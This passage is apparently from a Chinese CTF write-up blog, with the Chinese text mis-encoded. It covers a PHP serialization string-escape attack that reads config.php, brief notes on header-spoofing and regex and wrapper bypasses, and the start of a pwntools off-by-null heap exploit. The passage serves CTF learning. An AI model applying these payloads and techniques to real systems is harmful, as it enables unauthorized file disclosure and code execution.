alt=""></p><p>åŠ ä¸Šfilteræˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh8iacdmj31io09kdij.jpg" alt=""></p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>æœ´å®æ— åçš„bootstrapé£æ ¼çš„ç™»å½•é¡µé¢</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshe9fgsxj31hi0u040j.jpg" alt=""></p><p>sqlç›²æµ‹ä¿©æ•°æ®ï¼Œå‘ç°ä¸è¡Œï¼Œç›´æ¥urlæ é‡Œè¾“å…¥www.zipï¼Œwdnmdï¼ŒçœŸæœ‰æºç ï¼Œéƒ½ä¸ç”¨æ‰«çš„ï¼ŒğŸ‘´ğŸ»å–œæ¬¢ã€‚</p><p>æœ‰å¦‚ä¸‹æ–‡ä»¶ï¼Œpoc.phpå’Œinfo.phpæ˜¯æˆ‘åŠ çš„ç”¨æ¥åšæµ‹è¯•ç”¨çš„ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshfkfml7j30hc0o83zt.jpg" alt=""></p><p>å‘ç°config.phpé‡Œé¢æœ‰flag</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshj58c7dj30hy08sdgf.jpg" alt=""></p><p>ç„¶åå‘ç°index.phpæ˜¯ç™»å½•ï¼Œå¹¶æ²¡æœ‰sqlæ³¨å…¥çš„åœ°æ–¹ï¼Œè¿‡æ»¤çš„å¾ˆå¥½ã€‚</p><p>ç„¶åæœ‰æ³¨å†ŒåŠŸèƒ½ï¼Œæˆ‘ä»¬å…ˆæŒ‰æ­£å¸¸ä¸šåŠ¡èµ°èµ°ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshgtzwwoj30w40oimy8.jpg" alt=""></p><p>æ³¨å†Œä¸ªè´¦å·</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhboehjj30kg0l8q3s.jpg" alt=""></p><p>ç„¶åç™»å½•</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhvwfo0j30r20vajst.jpg" alt="">ç™»å½•æˆåŠŸåå‘ç°å¯ä»¥è¿›è¡Œprofileæ–‡ä»¶çš„æ›´æ”¹ï¼Œé‚£æ¼æ´å¤§æ¦‚åœ¨è¿™æ²¡è·‘äº†ï¼Œæˆ‘ä»¬è¿›åˆ°æºç é‡Œé¢å®¡è®¡ä¸€ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshkdrp46j31540fk0vd.jpg" alt=""></p><p>æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹çœ‹ä¼¼æ²¡æœ‰æ ¡éªŒæ–‡ä»¶ç±»å‹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ phpæ–‡ä»¶ä¸Šå»ä¼šè¢«md5ï¼Œåç¼€ä¼šè¢«ğŸ‘äº†ï¼Œæ‰€ä»¥æ²¡æ³•åˆ©ç”¨ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshlh1tu8j30x4066753.jpg" alt=""></p><p>ä¿¡æ¯è¾“å…¥å®Œæˆåä¼šè°ƒç”¨update_profileå‡½æ•°ï¼Œåºåˆ—åŒ–profileæ•°ç»„ï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshmsbnpwj30yc0aegmr.jpg" alt=""></p><p>ä¼šåšfilterå¤„ç†ï¼Œserialize + filterï¼ŒDNAåŠ¨äº†</p><p>å¤„ç†å®Œä¼šupdateåˆ°æ•°æ®åº“é‡Œé¢ï¼Œç„¶åè½¬åˆ°profile.phpæ˜¾ç¤ºä¿¡æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span> = <span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;unserialize:&quot;</span> . <span class="variable">$profile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">        &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">        &lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$nickname</span>; <span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">        &lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$phone</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">        &lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$email</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹ä¼šé¦–å…ˆååºåˆ—åŒ–ï¼Œç„¶åå¯ä»¥è¯»æ–‡ä»¶ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshrknyugj30xu0bwq4j.jpg" alt=""></p><p>é‚£ä¹ˆæ€è·¯é¡¿æ—¶æ¸…æ™°äº†èµ·æ¥ï¼Œååºåˆ—åŒ–çš„å˜é‡æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œåœ¨update.phpçš„é‚£ä¸ªåœ°æ–¹æˆ‘ä»¬èƒ½å¤Ÿå¡«å†™è¡¨å•æ¥æ§åˆ¶ï¼Œç„¶åæˆ‘ä»¬å¦‚æœæŠŠ$profile[â€˜photoâ€™]ç»™æ”¹å†™æˆconfig.phpé‚£ä¹ˆè¿™ä¸ªé¢˜å°±åšå‡ºæ¥äº†ã€‚</p><p>å›åˆ°æˆ‘ä»¬å¯æ§çš„ç‚¹update.phpå¤„ï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€äº›filter</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshtzstvoj31b80byq4v.jpg" alt=""></p><p>å› ä¸ºè¦æ§åˆ¶phptoè¿™ä¸ªå­—æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»nicknameå…¥æ‰‹ï¼Œé€šè¿‡ä¼ é€’æ•°ç»„å³å¯ç»•è¿‡é•¿åº¦å’Œæ­£åˆ™åˆ¤æ–­ã€‚</p><p>æˆ‘ä»¬å…ˆæœ¬åœ°å†™ä¸€å†™pocæ¥ç†ä¸€ç†æ€è·¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">array</span>(<span class="string">&quot;phone&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;phone&#x27;</span>], <span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&quot;nickname&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>], <span class="string">&quot;photo&quot;</span> =&gt; <span class="string">&quot;upload/&quot;</span> . md5(<span class="string">&quot;lemon.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$t</span>;</span><br><span class="line"><span class="comment">// a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;payload&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/31bddb5e1ea7e741dce2c091a0e8068d&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹æˆ‘ä»¬ä¼ å…¥ä¹‹ååšçš„filterï¼Œåœ¨class.phpä¸­ï¼Œåˆåšäº†ä¸€å±‚filterï¼Œæœ¬æ„æ˜¯é˜²æ­¢sqlæ³¨å…¥çš„ä¸€ä¸ªutilsæ–¹æ³•ï¼Œä½†æ˜¯ä¸åº”è¯¥ç”¨åœ¨åºåˆ—åŒ–å’Œååºåˆ—ä¸­ï¼Œæ³¨æ„åˆ°ï¼Œwhereæ˜¯äº”ä¸ªå­—ç¬¦ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºhackerï¼Œå˜æˆå…­ä¸ªå­—ç¬¦ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ¼æ´ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsi98ia09j30w60fm761.jpg" alt=""></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„payloadåº”è¯¥å¦‚ä¸‹æ„é€ ï¼Œæ˜¯ä»¥ä¸‹é¢è¿™ç§å½¢å¼</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lemon@hacker.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:7:&quot;...&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¦è€ƒè™‘é•¿åº¦é—®é¢˜ï¼Œå¯ä»¥ç”¨whereåˆ°hackerä½¿ä¹‹å¢é•¿ä¸€ä¸ªå­—ç¬¦ï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>)</span><br><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µçš„é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥å˜é•¿34ä¸ªå­—ç¬¦ï¼Œç”¨34ä¸ªwhereå³å¯å˜é•¿34ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å34ä¸ªå­—ç¬¦å¯ä»¥é€ƒé€¸å‡ºå»ï¼Œæˆ‘ä»¬æŠ“åŒ…æ¥æ‰“è¿™ä¸ªã€‚</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsiizdrn5j31h60u07hr.jpg" alt=""></p><p>è®¿é—®profile.phpï¼Œæ‹¿åˆ°base64encodeæ•°æ®</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsilxej6wj31h60u07bq.jpg" alt=""></p><p>æˆåŠŸè¯»å–flag</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsimjz0boj327y08y76p.jpg" alt=""></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsru5ix92j31140u00vw.jpg" alt=""></p><p>çœ‹äº†wpï¼Œå‘ç°æ˜¯æç¤ºâ€œæˆ‘è‡ªå·±â€ï¼Œäºæ˜¯è¯¥X-Forwarded-Forï¼Œä»€ä¹ˆè„‘æ´é¢˜ğŸ˜…</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsrtp8oirj31h60u0q8k.jpg" alt=""></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><ul><li>ä¼ å‚ä¸­çš„ç©ºæ ¼å’Œå°æ•°ç‚¹ä¼šè‡ªåŠ¨æ›¿æ¢ä¸ºä¸‹åˆ’çº¿</li><li>%0aå¯ä»¥ç»•è¿‡å¼€å¤´ç»“å°¾çš„æ­£åˆ™</li><li>Client-ipå’ŒX-Forwarded-Forç”¨æ¥è®°å½•ip</li><li>file_get_contentsåˆ©ç”¨ä¼ªåè®®å¯ä»¥ç»•è¿‡</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UJNCTFæ ¡èµ›wp</title>
      <link href="2021/10/11/UJNCTF%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>2021/10/11/UJNCTF%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="wp-by-lemon"><a href="#wp-by-lemon" class="headerlink" title="wp by lemon"></a>wp by lemon</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>ç­¾åˆ°é¢˜ï¼Œå› ä¸ºæ˜¯å‡ºé¢˜äººæ‰€ä»¥è¿˜æ˜¯å†™ä¸‹wp QAQ</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzom7s7kkj61h80lagp802.jpg" alt=""></p><p>editå‡½æ•°ä¸­è°ƒç”¨äº†sub_994ï¼Œç‚¹è¿›å»è§‚å¯Ÿå‡½æ•°</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzon020cfj616u0h8diw02.jpg" alt=""></p><p>è¿™ä¸ªå‡½æ•°æœ¬è´¨ä¸Šæ˜¯æƒ³å¦‚æœè¾“å…¥å›è½¦åå¡«å……00å­—èŠ‚æ¥ä»£æ›¿å›è½¦çš„â€™\x0aâ€™ï¼Œä½†æ˜¯å¿½ç•¥äº†å¡«å……å®Œå…¨çš„æƒ…å†µï¼Œå¯¼è‡´off-by-nullæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚</p><p>æ€è·¯ï¼šç”³è¯·ä¸€ç³»åˆ—å †å—ï¼Œé‡ç‚¹æœ‰ä¿©å †å—ï¼Œä¸€ä¸ªå †å—æ˜¯è¢«æº¢å‡ºçš„å †å—è®°ä¸ºvictimï¼Œå…¶sizeè¦æ»¡è¶³0x?f0çš„æ¡ä»¶ï¼Œå› ä¸ºåœ¨headerä¸­å¡«å……åå…¶sizeçš„ä½å­—èŠ‚ä¸º01ï¼Œoffbynullæº¢å‡ºåå…¶ä½å­—èŠ‚ä¸º00ï¼Œå¯ä»¥å‘å‰malloc_consolidateï¼›ä¸€ä¸ªå †å—æ˜¯victimçš„prev_sizeç´¢å¼•åˆ°çš„å †å—ï¼Œè¿™ä¸ªå †å—è¦æ»¡è¶³unsorted binå¤§å°ï¼Œå› ä¸ºåœ¨å‘å‰åˆå¹¶çš„è¿‡ç¨‹ä¸­ä¼šunlinkï¼Œä¼šæ£€æŸ¥fdå’Œbkçš„åˆæ³•æ€§ï¼Œåˆ©ç”¨unsorted binçš„ç‰¹æ€§è®©ç³»ç»Ÿå¸®æˆ‘ä»¬â€ä¼ªé€ â€œfdå’ŒbkæŒ‡é’ˆã€‚</p><p>ç„¶åæœ‰äº†overlapå²‚ä¸æ˜¯éšä¾¿ç©å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./null&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.27/lib/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span 